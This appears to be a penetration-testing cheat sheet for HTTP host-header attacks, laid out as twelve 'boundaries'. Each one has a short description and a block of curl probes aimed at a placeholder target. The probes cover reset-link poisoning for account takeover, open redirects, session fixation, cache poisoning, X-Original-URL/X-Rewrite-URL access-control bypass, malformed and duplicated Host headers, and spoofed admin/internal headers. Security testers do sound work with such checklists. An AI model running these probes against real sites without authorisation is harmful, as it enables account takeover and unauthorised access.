# Per-boundary — every host-header boundary, exhaustively

The boundary map — a header the app reads, a check the header gates.

---

## 1. The canonical-URL boundary — the generated links

```text
a canonical-URL check — a reflected host → the app's links/scripts
point to attacker.com — a stored injection — a canonical-URL sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
```

## 2. The reset-link boundary — the account takeover

```text
a reset-link check — a reflected forwarded header → the reset link
points to attacker.com — an account takeover — a reset-link sink.
```

```bash
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
```

## 3. The Location boundary — the open redirect

```text
a Location check — a reflected host → the Location points to
attacker.com — an open redirect — a Location sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/redirect" | grep -i 'location'
```

## 4. The Set-Cookie boundary — the session fixation

```text
a Set-Cookie check — a reflected host → the cookie domain binds to
attacker.com — a session fixation — a Set-Cookie sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
```

## 5. The cache-key boundary — the cache-poisoning feed

```text
a cache-key check — a reflected host → the cache stores the page
under attacker.com — a cache-poisoning feed — a cache-key sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
```

## 6. The rewrite boundary — the ACL bypass

```text
a rewrite check — a middleware rewrite → a 200 on the gated route —
an ACL bypass — a rewrite sink.
```

```bash
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

## 7. The forwarded boundary — the RFC 7239 form

```text
a forwarded check — a reflected forwarded header → the app's links
point to attacker.com — a stored injection — a forwarded sink.
```

```bash
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 8. The duplicated Host boundary — the parsing differential

```text
a duplicated Host — the proxy and the app parse differently — the
proxy reads the first; the app reads the second → a differential.
```

```bash
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: target.com' "$BASE/"
curl -s -D - -H 'Host: target.com' -H 'Host: good.example' "$BASE/"
```

## 9. The malformed Host boundary — the parsing edge

```text
a malformed Host — a trailing dot, a double-dot, an @-separator, a
#-separator, a ?-separator, an empty host, a forged port → a parsing
edge → a differential.
```

```bash
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: evil.example/target.com' "$BASE/"   # a path separator
curl -s -D - -H 'Host: target.com/evil.example' "$BASE/"   # a path separator
curl -s -D - -H 'Host: evil.example\\target.com' "$BASE/"   # a backslash separator
curl -s -D - -H 'Host: target.com\\evil.example' "$BASE/"   # a backslash separator
```

## 10. The absolute-URI boundary — the request-line differential

```text
an absolute-URI Host — a request-line differential — the proxy reads
the Host header; the app reads the absolute-URI → a differential.
```

```bash
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://target.com/'   # an absolute-URI
curl -s -D - "http://evil.example/" --resolve 'evil.example:443:127.0.0.1'   # an absolute-URI
curl -s -D - "http://target.com/" --resolve 'target.com:443:127.0.0.1'   # an absolute-URI
```

## 11. The multi-header boundary — the combined injection

```text
a multi-header bypass — a combined injection — a forged host + a
forged flag — a local + an internal check → a privileged route reached.
```

```bash
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api/debug" -H 'Host: evil.example' -H 'X-Debug: true'   # a host + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Host: attacker.com'   # a host + a forwarded host
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Proto: http'   # a host + a scheme
```

## 12. The multi-proxy boundary — the chained normalization

```text
a multi-proxy chain — a header each strips differently — a chained
normalization boundary — a per-layer differential.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # a chained server differential
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # a chained port differential
```
